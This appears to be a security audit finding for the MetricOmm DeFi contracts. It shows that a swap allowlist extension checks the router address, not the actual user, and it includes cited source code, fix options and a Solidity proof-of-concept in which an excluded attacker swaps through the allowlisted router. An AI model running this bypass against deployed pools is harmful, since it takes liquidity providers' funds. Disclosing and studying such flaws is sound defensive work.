### Title
`SwapAllowlistExtension` Gates the Router Address Instead of the Actual User, Allowing Full Allowlist Bypass via `MetricOmmSimpleRouter` — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap()` checks the `sender` argument passed by the pool, which equals the pool's `msg.sender` — the direct caller of `pool.swap()`. When a user routes through `MetricOmmSimpleRouter`, the pool's `msg.sender` is the router contract, not the end user. If the router is allowlisted (the natural configuration for a curated pool that still wants to support the official periphery), every user — including those explicitly excluded from the allowlist — can bypass the swap gate by routing through the router.

---

### Finding Description

`MetricOmmPool.swap()` passes `msg.sender` as the `sender` argument to `_beforeSwap`, which forwards it verbatim to every configured extension: [1](#0-0) 

`ExtensionCalling._beforeSwap()` encodes that same `sender` into the call to `IMetricOmmExtensions.beforeSwap`: [2](#0-1) 

`SwapAllowlistExtension.beforeSwap()` then checks whether that `sender` is on the allowlist, keyed by `msg.sender` (the pool): [3](#0-2) 

When a user calls `MetricOmmSimpleRouter.exactInput*`, the router calls `pool.swap(...)` directly. The pool's `msg.sender` is the router, so `sender` delivered to the extension is the router address — not the end user. The allowlist check becomes:

```
allowedSwapper[pool][router]   // router is checked, not the actual user
```

A pool admin who wants to allow router-mediated swaps must allowlist the router. Once the router is allowlisted, the guard passes for **every** user who routes through it, regardless of whether that individual user is on the allowlist. The individual-user allowlist is completely inoperative for the router path.

The `SwapAllowlistExtension` interface even exposes `isAllowedToSwap(pool, swapper)` as a per-user read, reinforcing the expectation that individual users are gated: [4](#0-3) 

The existing unit tests only exercise the direct-pool path (`vm.prank(address(pool))`), never the router path, so the bypass is untested: [5](#0-4) 

---

### Impact Explanation

A curated pool that uses `SwapAllowlistExtension` to restrict trading to a known set of counterparties (e.g., KYC'd addresses, protocol-owned accounts, or whitelisted market makers) loses that restriction entirely for any user who routes through `MetricOmmSimpleRouter`. Any excluded address can execute live swaps against the pool's liquidity at oracle prices, draining LP value or executing trades the pool admin explicitly prohibited. This is a direct loss of LP principal and a broken core pool invariant (the allowlist).

---

### Likelihood Explanation

The scenario requires only that the pool admin allowlists the router — the natural and expected configuration for any curated pool that still wants to support the official periphery. No privileged action by the attacker is needed; any user can call the public router. The `MetricOmmSimpleRouter` is a supported, documented periphery contract. The likelihood is **High** for any pool that combines `SwapAllowlistExtension` with router support.

---

### Recommendation

The extension must resolve the actual end user, not the intermediary. Two options:

1. **Pass the original `msg.sender` through the router as part of `extensionData`** and have the extension decode and verify it — but this is forgeable unless the pool enforces the encoding.

2. **Check `sender` against the allowlist only when `sender` is not a known trusted router; otherwise require the router to attest the real user in `extensionData`** — complex and fragile.

3. **Preferred:** Change the pool's `_beforeSwap` to pass an additional `origin` field (e.g., `tx.origin` or a router-attested user address stored in transient storage by the router before calling the pool), and have `SwapAllowlistExtension` gate on that field instead of `sender`. The router should write the real user into a transient slot before calling `pool.swap()`, and the extension reads it.

Until resolved, pools must not simultaneously configure `SwapAllowlistExtension` and allowlist `MetricOmmSimpleRouter`.

---

### Proof of Concept

```solidity
// Setup: curated pool with SwapAllowlistExtension
// Admin allowlists the router (so legitimate users can use it)
swapExtension.setAllowedToSwap(address(pool), address(router), true);
// Admin does NOT allowlist attacker
// swapExtension.setAllowedToSwap(address(pool), attacker, false); // default

// Attacker bypasses the allowlist via the router
vm.startPrank(attacker);
token0.approve(address(router), type(uint256).max);

// Router calls pool.swap() with msg.sender = router
// Extension sees sender = router (allowlisted) → passes
// Attacker's swap executes against the curated pool
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        tokenIn: address(token0),
        tokenOut: address(token1),
        pool: address(pool),
        recipient: attacker,
        amountIn: 1_000e18,
        amountOutMinimum: 0,
        priceLimitX64: 0,
        extensionData: ""
    })
);
// Attacker receives token1 from a pool they were explicitly excluded from
vm.stopPrank();
```

The `beforeSwap` check resolves to `allowedSwapper[pool][router] == true` and passes, even though `allowedSwapper[pool][attacker] == false`. The attacker receives pool output tokens; LP funds are transferred out in violation of the configured allowlist guard.

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/interfaces/extensions/ISwapAllowlistExtension.sol (L1-19)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

/// @title ISwapAllowlistExtension
/// @notice Per-pool swap allowlist admin and read API.
interface ISwapAllowlistExtension {
  event AllowedToSwapSet(address indexed pool, address indexed swapper, bool allowed);
  event AllowAllSwappersSet(address indexed pool, bool allowed);

  function allowedSwapper(address pool, address swapper) external view returns (bool);

  function allowAllSwappers(address pool) external view returns (bool);

  function setAllowedToSwap(address pool, address swapper, bool allowed) external;

  function setAllowAllSwappers(address pool, bool allowed) external;

  function isAllowedToSwap(address pool, address swapper) external view returns (bool);
}
```
